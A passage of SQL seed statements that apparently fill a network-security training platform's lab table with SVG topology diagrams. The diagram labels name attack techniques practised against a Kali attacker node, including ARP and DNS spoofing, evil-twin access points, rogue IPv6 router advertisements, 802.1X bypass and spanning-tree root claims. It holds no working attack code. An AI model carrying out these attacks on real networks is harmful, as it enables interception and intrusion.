  <line x1="61" y1="130" x2="319" y2="130" stroke="#6b7480" stroke-width="2" stroke-dasharray="3 3"/>
  <text x="190" y="158" text-anchor="middle" font-size="9" fill="#6b7480">10.0.0.0/24 ← → 192.168.2.0/24</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="240" y="20" width="220" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · ACL Gateway</text>
  <text x="350" y="64" text-anchor="middle" font-size="10" fill="#6b7480">Gi0/0: 10.0.0.1 · Gi0/1: 192.168.2.1</text>
  <line x1="120" y1="190" x2="280" y2="74" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="420" y1="74" x2="580" y2="190" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="420" y1="74" x2="420" y2="190" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <rect x="30" y="190" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="216" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1 ✅</text>
  <text x="120" y="234" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.100 · permitted</text>
  <rect x="490" y="190" width="180" height="54" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="580" y="216" text-anchor="middle" font-size="14" fill="#6b7480" font-weight="600">PC2 (server)</text>
  <text x="580" y="234" text-anchor="middle" font-size="10" fill="#6b7480">192.168.2.100 · HTTP port 80</text>
  <rect x="300" y="190" width="240" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="420" y="216" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI ❌</text>
  <text x="420" y="234" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.200 · spoof · frag · route-around</text>
</svg>', '["Router (ACL enforcement)", "Authorized client", "Protected server", "Attacker (ACL bypass)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (9, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200" font-family="ui-monospace,monospace">
  <rect x="6" y="10" width="110" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="61" y="33" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 (inside)</text>
  <rect x="140" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="200" y="33" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (NAT)</text>
  <rect x="284" y="10" width="110" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="339" y="33" text-anchor="middle" font-size="12" fill="#6b7480" font-weight="600">R2 (ISP)</text>
  <line x1="116" y1="30" x2="140" y2="30" stroke="#2563eb" stroke-width="2"/>
  <line x1="260" y1="30" x2="284" y2="30" stroke="#6b7480" stroke-width="2"/>
  <rect x="284" y="100" width="110" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="339" y="123" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC2 (outside)</text>
  <rect x="6" y="100" width="110" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="61" y="123" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI (outside)</text>
  <line x1="61" y1="100" x2="200" y2="50" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <line x1="339" y1="50" x2="339" y2="100" stroke="#6b7480" stroke-width="2"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="40" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="130" y="46" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1 (inside)</text>
  <text x="130" y="64" text-anchor="middle" font-size="10" fill="#6b7480">192.168.1.100</text>
  <rect x="240" y="20" width="220" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · NAT Gateway</text>
  <text x="350" y="64" text-anchor="middle" font-size="10" fill="#6b7480">inside 192.168.1.1 → outside 10.0.0.1</text>
  <rect x="480" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="570" y="46" text-anchor="middle" font-size="14" fill="#6b7480" font-weight="600">R2 (ISP)</text>
  <text x="570" y="64" text-anchor="middle" font-size="10" fill="#6b7480">203.0.113.0/24</text>
  <line x1="220" y1="47" x2="240" y2="47" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="460" y1="47" x2="480" y2="47" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="70" y="180" width="180" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="160" y="206" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI (outside)</text>
  <text x="160" y="224" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.x · IP ID · ALG · port prediction</text>
  <rect x="460" y="180" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="550" y="206" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC2 (outside)</text>
  <text x="550" y="224" text-anchor="middle" font-size="10" fill="#6b7480">203.0.113.100 · server</text>
  <line x1="160" y1="180" x2="350" y2="74" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
  <line x1="550" y1="180" x2="350" y2="74" stroke="#6b7480" stroke-width="2.5"/>
</svg>', '["Internal host (NAT''d)", "NAT gateway", "ISP / outside router", "Attacker (NAT probing)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (10, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (DNS)</text>
  <line x1="65" y1="90" x2="165" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="230" y1="50" x2="300" y2="90" stroke="#6b7480" stroke-width="2"/>
  <line x1="190" y1="50" x2="190" y2="130" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <rect x="10" y="90" width="110" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="65" y="113" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 (client)</text>
  <rect x="252" y="90" width="110" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="307" y="113" text-anchor="middle" font-size="12" fill="#6b7480" font-weight="600">PC2 (server)</text>
  <rect x="120" y="130" width="140" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="153" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI · dns_spoof</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="230" y="20" width="240" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · DNS + Gateway</text>
  <text x="350" y="64" text-anchor="middle" font-size="10" fill="#6b7480">DNS server · netbreakerlab.com → 192.168.1.200</text>
  <line x1="80" y1="190" x2="280" y2="74" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="460" y1="74" x2="600" y2="190" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="350" y1="74" x2="350" y2="270" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <rect x="10" y="190" width="150" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="85" y="216" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1 (victim)</text>
  <text x="85" y="234" text-anchor="middle" font-size="10" fill="#6b7480">queries www.netbreakerlab.com</text>
  <rect x="520" y="190" width="160" height="54" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="600" y="216" text-anchor="middle" font-size="14" fill="#6b7480" font-weight="600">PC2 (real server)</text>
  <text x="600" y="234" text-anchor="middle" font-size="10" fill="#6b7480">192.168.1.200 · HTTP</text>
  <rect x="200" y="270" width="300" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="350" y="296" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI · ARP spoof + DNS spoof</text>
  <text x="350" y="316" text-anchor="middle" font-size="10" fill="#6b7480">ettercap dns_spoof → fake A record 192.168.1.50</text>
</svg>', '["DNS server / gateway", "Client (DNS resolver)", "Real web server", "Attacker (DNS spoofer)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (12, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (RADIUS)</text>
  <rect x="130" y="74" width="120" height="36" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="95" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1 (802.1X)</text>
  <line x1="190" y1="50" x2="190" y2="74" stroke="#6b7480" stroke-width="2"/>
  <rect x="10" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="171" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 ✅</text>
  <rect x="140" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="171" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI ❌</text>
  <rect x="270" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="320" y="171" text-anchor="middle" font-size="12" fill="#6b7480" font-weight="600">PC2 ❌</text>
  <line x1="60" y1="148" x2="155" y2="110" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="148" x2="190" y2="110" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <line x1="320" y1="148" x2="225" y2="110" stroke="#6b7480" stroke-width="2" stroke-dasharray="3 3"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="230" y="20" width="240" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · RADIUS Server</text>
  <text x="350" y="62" text-anchor="middle" font-size="10" fill="#6b7480">AAA · EAP · port 1812</text>
  <rect x="230" y="100" width="240" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="126" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1 · 802.1X Authenticator</text>
  <text x="350" y="142" text-anchor="middle" font-size="10" fill="#6b7480">dot1x pae authenticator</text>
  <line x1="350" y1="70" x2="350" y2="100" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="30" y="260" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="286" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1 ✅</text>
  <text x="120" y="304" text-anchor="middle" font-size="10" fill="#6b7480">supplicant · EAP-MD5</text>
  <rect x="260" y="260" width="180" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="350" y="286" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI ❌</text>
  <text x="350" y="304" text-anchor="middle" font-size="10" fill="#6b7480">EAP relay · MAB bypass · RADIUS DoS</text>
  <rect x="490" y="260" width="180" height="54" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="580" y="286" text-anchor="middle" font-size="14" fill="#6b7480" font-weight="600">PC2 ❌</text>
  <text x="580" y="304" text-anchor="middle" font-size="10" fill="#6b7480">no supplicant · port blocked</text>
  <line x1="120" y1="260" x2="290" y2="150" stroke="#2563eb" stroke-width="2"/>
  <line x1="350" y1="260" x2="350" y2="150" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
  <line x1="580" y1="260" x2="410" y2="150" stroke="#6b7480" stroke-width="2" stroke-dasharray="3 3"/>
</svg>', '["RADIUS authentication server", "802.1X authenticator switch", "Authenticated client", "Unauthorized / attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (13, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <circle cx="60" cy="90" r="40" fill="none" stroke="#2563eb" stroke-width="2" stroke-dasharray="4 4"/>
  <text x="55" y="40" text-anchor="middle" font-size="10" fill="#2563eb">legit AP</text>
  <circle cx="320" cy="90" r="40" fill="none" stroke="#e5484d" stroke-width="2" stroke-dasharray="4 4"/>
  <text x="325" y="40" text-anchor="middle" font-size="10" fill="#e5484d">rogue AP</text>
  <rect x="130" y="14" width="120" height="38" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="36" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="190" y1="52" x2="190" y2="100" stroke="#6b7480" stroke-width="2"/>
  <text x="190" y="80" text-anchor="middle" font-size="11" fill="#6b7480">NetBreaker-WiFi</text>
  <line x1="135" y1="110" x2="120" y2="130" stroke="#2563eb" stroke-width="2"/>
  <line x1="245" y1="110" x2="260" y2="130" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <rect x="50" y="130" width="140" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="120" y="155" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 (client)</text>
  <rect x="190" y="130" width="140" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="260" y="155" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI (rogue AP)</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="230" y="10" width="240" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="36" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1 (wired backbone)</text>
  <line x1="140" y1="60" x2="260" y2="140" stroke="#2563eb" stroke-width="2"/>
  <line x1="560" y1="60" x2="440" y2="140" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
  <rect x="220" y="168" width="260" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="350" y="196" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="700">AP1 · legit NetBreaker-WiFi</text>
  <text x="350" y="212" text-anchor="middle" font-size="10" fill="#6b7480">BSSID: AA:BB:CC:11:22:33 · ch 6 · WPA2</text>
  <rect x="40" y="250" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="130" y="276" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1 (client)</text>
  <text x="130" y="294" text-anchor="middle" font-size="10" fill="#6b7480">connected to NetBreaker-WiFi</text>
  <rect x="480" y="250" width="180" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="570" y="276" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI (rogue AP)</text>
  <text x="570" y="294" text-anchor="middle" font-size="10" fill="#6b7480">hostapd · SSID: NetBreaker-WiFi</text>
  <line x1="130" y1="250" x2="300" y2="218" stroke="#2563eb" stroke-width="2"/>
  <line x1="480" y1="280" x2="400" y2="218" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
  <text x="570" y="230" font-size="11" fill="#e5484d">↑ deauth → client roams here</text>
</svg>', '["Legitimate access point", "Legitimate client", "Rogue access point (evil twin)", "Deauthentication attack"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (14, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (IPv6 gw)</text>
  <rect x="130" y="74" width="120" height="36" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="95" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="190" y1="50" x2="190" y2="74" stroke="#6b7480" stroke-width="2"/>
  <rect x="10" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="171" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC1</text>
  <rect x="140" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="190" y="171" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC2</text>
  <rect x="270" y="148" width="100" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="320" y="171" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI</text>
  <line x1="60" y1="148" x2="155" y2="110" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="148" x2="190" y2="110" stroke="#2563eb" stroke-width="2"/>
  <line x1="320" y1="148" x2="225" y2="110" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="230" y="20" width="240" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · IPv6 Gateway</text>
  <text x="350" y="62" text-anchor="middle" font-size="10" fill="#6b7480">2001:db8:1::1/64 · RA every 200s</text>
  <rect x="230" y="100" width="240" height="46" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="126" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1 · RA Guard</text>
  <text x="350" y="142" text-anchor="middle" font-size="10" fill="#6b7480">port Gi0/3: untrusted · RAs dropped</text>
  <line x1="350" y1="70" x2="350" y2="100" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="40" y="250" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="130" y="276" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1</text>
  <text x="130" y="294" text-anchor="middle" font-size="10" fill="#6b7480">SLAAC: 2001:db8:1::100</text>
  <rect x="480" y="250" width="180" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="570" y="276" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI</text>
  <text x="570" y="294" text-anchor="middle" font-size="10" fill="#6b7480">rogue RA · NA spoof · mitm6</text>
  <line x1="130" y1="250" x2="290" y2="146" stroke="#2563eb" stroke-width="2"/>
  <line x1="480" y1="276" x2="410" y2="146" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["IPv6 router / gateway", "Switch with RA Guard", "IPv6 host", "Attacker (NDP spoof)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (2, '<svg viewBox="0 0 320 220" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <line x1="160" y1="40" x2="70" y2="150" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="160" y1="40" x2="250" y2="150" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="70" y1="150" x2="250" y2="150" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 4"/>
  <rect x="120" y="18" width="80" height="34" rx="7" fill="#fff" stroke="#10855f" stroke-width="1.6"/>
  <text x="160" y="40" text-anchor="middle" font-size="12" fill="#10855f" font-weight="700">SW1 👑</text>
  <rect x="26" y="150" width="80" height="34" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="66" y="172" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW2</text>
  <rect x="206" y="150" width="80" height="34" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="246" y="172" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW3</text>
  <text x="160" y="196" text-anchor="middle" font-size="9" fill="#e5484d">✂ one link BLOCKED by STP</text>
</svg>', '<svg viewBox="0 0 760 460" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <line x1="380" y1="90" x2="180" y2="240" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="380" y1="90" x2="580" y2="240" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="180" y1="260" x2="580" y2="260" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="8 5"/>
  <text x="380" y="290" text-anchor="middle" font-size="10" fill="#e5484d">blocked by STP (loop-prevention)</text>

  <line x1="120" y1="352" x2="176" y2="286" stroke="#2563eb" stroke-width="2"/>
  <line x1="640" y1="352" x2="584" y2="286" stroke="#e5484d" stroke-width="2.2" stroke-dasharray="6 4"/>

  <rect x="330" y="46" width="100" height="46" rx="9" fill="#fff" stroke="#10855f" stroke-width="1.8"/>
  <text x="380" y="68" text-anchor="middle" font-size="13" fill="#10855f" font-weight="700">SW1 👑</text>
  <text x="380" y="83" text-anchor="middle" font-size="9" fill="#6b7480">root bridge</text>

  <rect x="120" y="238" width="120" height="48" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="180" y="260" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW2</text>
  <text x="180" y="275" text-anchor="middle" font-size="9" fill="#6b7480">secondary root</text>

  <rect x="520" y="238" width="120" height="48" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="580" y="260" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW3</text>
  <text x="580" y="275" text-anchor="middle" font-size="9" fill="#6b7480">Fa0/2 → BPDU Guard ⚠</text>

  <rect x="56" y="352" width="120" height="46" rx="9" fill="#fff" stroke="#2563eb" stroke-width="1.6"/>
  <text x="116" y="374" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="116" y="389" text-anchor="middle" font-size="8.5" fill="#6b7480">ordinary host</text>

  <rect x="580" y="352" width="128" height="48" rx="9" fill="#fff" stroke="#e5484d" stroke-width="1.8"/>
  <text x="644" y="374" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="700">KALI · attacker</text>
  <text x="644" y="389" text-anchor="middle" font-size="8.5" fill="#6b7480">claims root via BPDU</text>
</svg>', '["Root bridge (SW1)", "Secondary root (SW2)", "Blocked link (loop prevention)", "Attacker (Kali) — BPDU claim"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (16, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 180" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="60" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">SW1</text>
  <rect x="270" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="320" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">SW2</text>
  <line x1="110" y1="28" x2="270" y2="28" stroke="#6b7480" stroke-width="2" stroke-dasharray="5 3"/>
  <text x="190" y="24" text-anchor="middle" font-size="7" fill="#6b7480">??? cable</text>
  <rect x="140" y="80" width="100" height="30" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="99" text-anchor="middle" font-size="10" fill="#14161a">R1 (console)</text>
  <rect x="10" y="132" width="100" height="30" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="152" text-anchor="middle" font-size="10" fill="#2563eb">PC1</text>
  <rect x="140" y="132" width="100" height="30" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="152" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text>
  <line x1="60" y1="132" x2="60" y2="46" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="132" x2="190" y2="110" stroke="#e5484d" stroke-width="2"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 280" font-family="ui-monospace,monospace">
  <rect x="40" y="14" width="160" height="44" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="120" y="36" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW1</text>
  <text x="120" y="52" text-anchor="middle" font-size="8" fill="#6b7480">ports: Gi0/1–24</text>
  <rect x="400" y="14" width="160" height="44" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="480" y="36" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW2</text>
  <text x="480" y="52" text-anchor="middle" font-size="8" fill="#6b7480">ports: Gi0/1–24</text>
  <line x1="200" y1="36" x2="400" y2="36" stroke="#2563eb" stroke-width="2"/>
  <text x="300" y="32" text-anchor="middle" font-size="9" fill="#2563eb">crossover or auto-MDIX</text>
  <rect x="390" y="100" width="100" height="32" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="440" y="121" text-anchor="middle" font-size="10" fill="#14161a">R1 (console)</text>
  <rect x="40" y="180" width="120" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="100" y="202" text-anchor="middle" font-size="11" fill="#2563eb">PC1</text>
  <rect x="190" y="180" width="120" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="250" y="202" text-anchor="middle" font-size="11" fill="#2563eb">PC2</text>
  <rect x="420" y="180" width="140" height="40" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="490" y="204" text-anchor="middle" font-size="11" fill="#e5484d">KALI (tapper)</text>
  <line x1="100" y1="180" x2="110" y2="58" stroke="#2563eb" stroke-width="2"/>
  <line x1="250" y1="180" x2="280" y2="58" stroke="#6b7480" stroke-width="2"/>
  <line x1="490" y1="180" x2="460" y2="132" stroke="#e5484d" stroke-width="2"/>
</svg>', '["Layer-2 switch", "Inter-switch link (cable type critical)", "Router (console-access port)", "End host", "Attacker (physical tap)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (18, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 140" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="120" height="44" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="70" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R1</text>
  <text x="70" y="48" text-anchor="middle" font-size="8" fill="#6b7480">IOS · CLI</text>
  <rect x="160" y="10" width="120" height="44" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="220" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <text x="220" y="48" text-anchor="middle" font-size="8" fill="#6b7480">IOS · CLI</text>
  <rect x="10" y="84" width="120" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="70" y="108" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI</text>
  <rect x="160" y="84" width="120" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="220" y="108" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC1 (admin)</text>
  <line x1="130" y1="32" x2="160" y2="32" stroke="#6b7480" stroke-width="2"/>
  <line x1="70" y1="84" x2="130" y2="54" stroke="#e5484d" stroke-width="2"/>
